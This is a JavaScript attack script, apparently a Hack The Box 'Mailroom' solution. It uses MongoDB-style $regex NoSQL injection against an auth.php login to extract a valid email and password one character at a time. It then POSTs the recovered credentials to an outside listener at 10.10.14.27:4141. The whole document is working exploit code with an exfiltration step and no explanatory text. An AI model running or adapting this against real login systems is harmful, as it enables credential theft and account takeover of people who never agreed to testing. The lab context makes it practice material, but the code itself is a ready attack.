let email = "";
let password = "";
let prevEmailLength = 0;
let prevPasswordLength = 0;
const authUrl = "http://127.0.0.1:8008/auth.php";  // Local staffroom app instance
// const authUrl = "http://staff-review-panel.mailroom.htb/auth.php";
const headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
};

// const printable = [...Array(127).keys()].map(i => String.fromCharCode(i)).join('');
const printable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~';

async function sendRequest(payload, url) {
  const options = {
    method: 'POST',
    headers: headers,
    body: payload,
    redirect: 'manual'
  };
  const response = await fetch(url, options);
  const body = await response.text();
  return {
    status: response.status,
    headers: response.headers,
    body: body
  };
}


async function findValidEmail() {
    while (true) {
        let foundValidMailChar = false;
        for (const c of printable) {
            if (!['*', '+', '.', '?', '|', '&', '$', '\r', '\n', '\t', '\v'].includes(c)) {
                const payload = `email[$regex]=^${email + c}&password[$regex]=^`;
                const res = await sendRequest(payload, authUrl);
                if (res.body.includes('Check your inbox for an email with your 2FA token')) {
                    email += c;
                    foundValidMailChar = true;
                    // console.log(`Found one more char for email: ${email}`);
                }
            }
        }
        if (email.length === prevEmailLength || !foundValidMailChar) {
            break;
        }
        prevEmailLength = email.length;
    }
}


async function findValidPassword() {
    while (true) {
        let foundValidPassChar = false;
        for (const c of printable) {
            if (!['*', '+', '.', '?', '|', '&', '$', '\r', '\n', '\t', '\v'].includes(c)) {
                const payload = `email[$regex]=^${email}&password[$regex]=^${password + c}`;
                const res = await sendRequest(payload, authUrl);
                if (res.body.includes('Check your inbox for an email with your 2FA token')) {
                    password += c;
                    foundValidPassChar = true;
                    // console.log(`Found one more char: ${password + c}`);
                }
            }
        }
        if (!foundValidPassChar || password.length === prevPasswordLength) {
            break;
        }
        prevPasswordLength = password.length;
    }
}

(async function () {
    await findValidEmail();
    console.log(`Valid email found: ${email}`);
    await findValidPassword();
    console.log(`Valid password found: ${password}`);

    const payload = `email=${email}&password=${password}`;
    const res = await sendRequest(payload, 'http://10.10.14.27:4141/');
})();
